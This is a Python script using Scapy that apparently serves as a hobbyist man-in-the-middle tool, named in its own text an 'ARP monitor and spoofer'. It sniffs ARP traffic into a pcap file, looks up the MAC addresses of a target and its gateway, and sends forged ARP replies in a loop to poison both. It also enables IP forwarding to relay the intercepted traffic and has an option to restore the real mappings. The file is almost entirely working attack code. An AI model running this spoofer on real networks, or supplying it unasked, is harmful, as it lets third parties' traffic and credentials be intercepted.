#!/usr/bin/env python3
 
from scapy.all import *
from scapy.modules import *
from scapy import *
import scapy.all as scapy
from sys import platform
import time



#Sniffing all broadcast packets


def arp_monitor_callback(pkt):
    pending_packets = []
    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at
        pending_packets.append(pkt)
        wrpcap('mitm_attack/arp_monitor.pcap', pending_packets, append=True)
        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")


def do_sniff(num_packets, *interface):
    if interface:
        sniff(prn=arp_monitor_callback, filter="arp", store=0, count=num_packets, iface=interface)
    else:
        sniff(prn=arp_monitor_callback, filter="arp", store=0, count=num_packets)
    print('Sniffing complete. ARP packets saved to mitm_attack/arp_monitor.pcap')




#Extracting the MAC and IP addresses from the sniffed packets
def read_bytes_from_pcap():
    packets = rdpcap('mitm_attack/arp_monitor.pcap')
    packet_dict = {}
    packet_dict = {packet[ARP].hwsrc: [packet[ARP].hwdst, packet[ARP].psrc, packet[ARP].pdst] for packet in packets}
    return packet_dict

def get_mac_of_target(target_ip, packet_dict):
    for k in packet_dict.keys():
        if packet_dict[k][1] == target_ip:
            return k
    else:
        print('Target IP not found in ARP packets. Please try again.')
        main()
    
def toggle_IP_forward():
    if platform == 'linux' or platform == 'linux2':            
        path = '/proc/sys/net/ipv4/ip_forward'
        with open(path, "rb") as file:
                if file.read() == b'1':
                    with open(path, "wb") as file:
                        file.write(b'0')
                else:
                    with open(path, "wb") as file:
                        file.write(b'1')
        main()
    elif platform == 'darwin':
        print('MacOS not supported yet.')
        main()
    elif platform == 'win32':
        print('Enable IP forwarding with "run" regedit: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\EnableRouter')
        main()

def view_working_pcap():
    packets = read_bytes_from_pcap()
    for k in packets.keys():
        print(f'MAC: {k} | Src.IP: {packets[k][1]}')


def spoof(target_ip, gateway_ip, *interface):
    packet_dict = read_bytes_from_pcap()
    target1_mac = get_mac_of_target(target_ip, packet_dict)
    gateway_mac = get_mac_of_target(gateway_ip, packet_dict)

    if interface:
        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac), iface=interface)
        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=interface)
    else:
        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac))
        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))


def send_fix(target_ip, gateway_ip, *interface):
    packet_dict = read_bytes_from_pcap()
    target1_mac = get_mac_of_target(target_ip, packet_dict)
    gateway_mac = get_mac_of_target(gateway_ip, packet_dict)
    if interface:
        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac, hwsrc=gateway_mac), iface=interface)
        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target1_mac), iface=interface)
    else:
        scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac, hwsrc=gateway_mac))
        scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target1_mac))


def main():

    print('Welcome to the ARP monitor and spoofer') #lets make a better name for this lol
    is_inface = input('Would you like to specify an interface? (y/n): ')
    if is_inface == 'y':
        interface = input('Enter interface name: ')
    else:
        interface = None
    user_in = input('What would you like to do? (1) Monitor ARP packets (2) Spoof ARP packets (3) View working pcap (4) Toggle IP Forwarding (5) Fix ARP spoof (6) Exit \n')
    if user_in != '1' and user_in != '2' and user_in != '3' and user_in != '4' and user_in != '5' and user_in != '6':
        print('Invalid input. Please try again.')
        main()
    elif user_in == '1':
        num_packets = input('how many packets would you like to sniff? ')
        print(f'Sniffing {num_packets} ARP packets...')
        do_sniff(int(num_packets), interface)
        main()
    elif user_in == '2':
        target = input('What is the target IP? ')
        gateway = input('What is the gateway IP? ')
        print('Spoofing ARP packets...')
        print('Press CTRL+C to stop spoofing.')
        while True:
            time.sleep(1)
            spoof(target, gateway, interface)
    elif user_in == '3':
        view_working_pcap()
    elif user_in == '4':
        toggle_IP_forward()
    elif user_in == '5':
        target = input('What is the target IP? ')
        gateway = input('What is the gateway IP? ')
        print('Fixing ARP packets...')
        for _ in range (16):
            send_fix(target, gateway, interface)
    elif user_in == '6':
        exit()


if __name__ == '__main__':
    main()